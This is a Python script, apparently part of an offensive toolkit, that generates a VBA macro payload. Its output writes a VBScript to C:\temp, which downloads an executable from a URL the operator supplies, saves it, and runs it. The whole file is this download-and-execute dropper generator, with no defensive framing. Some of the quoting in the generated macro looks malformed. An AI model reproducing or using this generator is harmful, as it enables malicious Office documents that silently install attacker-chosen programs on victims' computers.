#!/usr/bin/python3

def macro_gen(_Name, _EXEUrl):
    vEXE = _Name + ".exe"
    vMACRO = "./Payloads/" + _Name + ".vba"
    try:
        macro = "Sub WriteQuiggle()\n"
        macro += "Dim QuiggleFile As Integer\n"
        macro += "Dim FilePath As String\n"
        macro += "FilePath = \n"
        macro += r'"C:\temp\quiggle.vbs"'
        macro += "\nQuiggleFile = FreeFile\n"
        macro += "Open FilePath For Output as TextFile\n"
        macro += r'Print #QuiggleFile, "HTTPDownload "'
        macro += str(_EXEUrl)
        macro += "/"
        macro += str(vEXE)
        macro += r'", "C:\temp""'
        macro += '\nPrint #QuiggleFile, "  Sub HTTPDownload( myURL, myPath )"\n'
        macro += 'Print #QuiggleFile, "    Dim i, objFile, objFSO, objHTTP, strFile, strMsg"\n'
        macro += 'Print #QuiggleFile, "	 Const ForReading = 1, ForWriting = 2, ForAppending = 8"\n'
        macro += 'Print #QuiggleFile, "    Set objFSO = CreateObject( "Scripting.FileSystemObject" )"\n'
        macro += 'Print #QuiggleFile, "    If objFSO.FolderExists( myPath ) Then"\n'
        macro += 'Print #QuiggleFile, "      strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )"\n'
        macro += r'Print #QuiggleFile, "    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) +1 ) ) Then"'
        macro += '\nPrint #QuiggleFile, "      strFile = myPath"\n'
        macro += 'Print #QuiggleFile, "    End If"\n'
        macro += 'Print #QuiggleFile, "	   Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )"\n'
        macro += 'Print #QuiggleFile, "      Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )"\n'
        macro += 'Print #QuiggleFile, "      objHTTP.Open "GET", myURL, False"\n'
        macro += 'Print #QuiggleFile, "      objHTTP.Send"\n'
        macro += 'Print #QuiggleFile, "      For i = 1 to LenB( objHTTP.ResponseBody )"\n'
        macro += 'Print #QuiggleFile, "        objFile.Write Chr(AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )"\n'
        macro += 'Print #QuiggleFile, "    Next"\n'
        macro += 'Print #QuiggleFile, "    objfile.Close()"\n'
        macro += 'Print #QuiggleFile, "    Set WshShell = wscript.CreateObject("Wscript.Shell")"\n'
        macro += 'Print #QuiggleFile, "    WshShell.Run "'
        macro += r"c:\temp"
        macro += chr(92)
        macro += str(vEXE)
        macro += '""\n'
        macro += 'Print #QuiggleFile, "    End Sub"\n'
        macro += 'Close QuiggleFile\n'
        macro += r'Shell "wscript c:\temp\quiggle.vbs"'
        macro += '\nEnd Sub\n'

        mf = open(vMACRO, "w+")
        mf.write(macro)
        mf.close()

    except Exception as e:
        print('\n[!] Error, Unable to write VBA Macro.')
        print(' Yielded the following error %s' % e)
